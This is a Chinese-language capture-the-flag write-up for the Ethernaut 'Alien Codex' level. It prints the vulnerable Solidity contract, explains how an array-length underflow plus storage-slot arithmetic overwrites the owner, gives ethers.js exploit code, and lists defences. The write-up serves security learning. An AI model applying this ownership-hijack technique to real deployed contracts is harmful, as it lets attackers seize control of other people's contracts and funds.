# Ethernaut - Alien Codex 解題紀錄

這個專案是 [Ethernaut](https://ethernaut.openzeppelin.com/) 智能合約安全闖關遊戲中 Alien Codex 關卡的解題方案。

## 挑戰目標

在 Alien Codex 挑戰中，我們需要奪取合約的所有權（將 owner 改為我們的地址）。

## 合約分析

這個合約繼承了 `Ownable` 合約，並且包含以下主要組件：

```solidity
contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

## 漏洞分析

合約中存在兩個主要漏洞：

1. **整數下溢（Integer Underflow）**：在 `retract()` 函數中，當 `codex` 陣列為空時，`codex.length--` 會導致長度下溢，變成 2^256-1，這讓我們可以存取任意的儲存位置。

2. **儲存佈局知識**：利用 Solidity 儲存佈局的知識，我們可以通過操作 `codex` 陣列來修改合約的 `owner` 變數。

## 解題思路

解題步驟如下：

1. 調用 `makeContact()` 來設置 `contact = true`，這樣我們才能使用其他需要 `contacted` 修飾器的函數。

2. 調用 `retract()` 函數造成 `codex` 陣列長度下溢，讓我們能夠存取任意儲存位置。

3. 計算出儲存 `owner` 變數的位置對應的 `codex` 陣列索引：
   - Solidity 中動態陣列 `codex` 的資料是從 `keccak256(slot_of_codex) + 0, 1, 2, ...` 開始
   - `owner` 變數在儲存槽 0
   - `codex` 陣列在儲存槽 1
   - 因此我們需要找到一個索引 `i`，使得：`keccak256(1) + i ≡ 0 (mod 2^256)`
   - 所以 `i = 2^256 - keccak256(1)`

4. 調用 `revise(i, address)` 函數，傳入計算出的索引和我們的地址（填充為 32 bytes），將 `owner` 變更為我們的地址。

## 程式碼實現

```typescript
// 1. makeContact
await alienCodex.makeContact();

// 2. 透過 retract 造成整數下溢，讓 codex 陣列長度變為 2^256-1
await alienCodex.retract();

// 3. 計算 owner 位置的陣列索引
const codexArrayStorageSlot = "0x0000000000000000000000000000000000000000000000000000000000000001";
const codexDataStartStorageSlot = ethers.keccak256(codexArrayStorageSlot);
const NUMBER_OF_SLOTS = BigInt(2) ** BigInt(256);
const ownerPositionInMap = NUMBER_OF_SLOTS - BigInt(codexDataStartStorageSlot);

// 4. 利用 revise 將 owner 改為我們的地址
const parsedAddress = ethers.zeroPadValue(signer.address, 32);
await alienCodex.revise(ownerPositionInMap, parsedAddress);
```

## 學習要點

1. **Solidity 儲存佈局**：了解 Solidity 如何在儲存中佈局變數，特別是繼承合約時的儲存佈局和動態陣列的儲存方式。

2. **整數下溢風險**：在 Solidity 0.8.0 版本之前，整數運算沒有自動檢查溢出/下溢，這導致了許多安全漏洞。

3. **EVM 儲存機制**：了解 EVM 的儲存槽機制，每個槽位 32 字節，以及如何通過操作一個變數間接改變另一個變數。

4. **陣列存取控制**：合約應該實現嚴格的陣列索引範圍檢查，防止越界存取。

5. **合約安全性**：這個挑戰強調了在智能合約開發中理解底層實現細節的重要性。

## 防禦措施

要防止類似的漏洞，可以採取以下措施：

1. 使用 SafeMath 庫或 Solidity 0.8.0+ 版本來防止整數溢出/下溢。
2. 實現嚴格的存取控制和索引範圍檢查。
3. 確保陣列操作安全，特別是在減少長度時。
4. 對敏感操作（如更改所有權）實施多重驗證機制。

## 總結

Alien Codex 挑戰展示了 Solidity 儲存佈局和整數下溢的結合可能導致的嚴重安全漏洞。通過理解 EVM 的工作原理，我們能夠巧妙地利用合約中的設計缺陷來劫持合約的所有權。
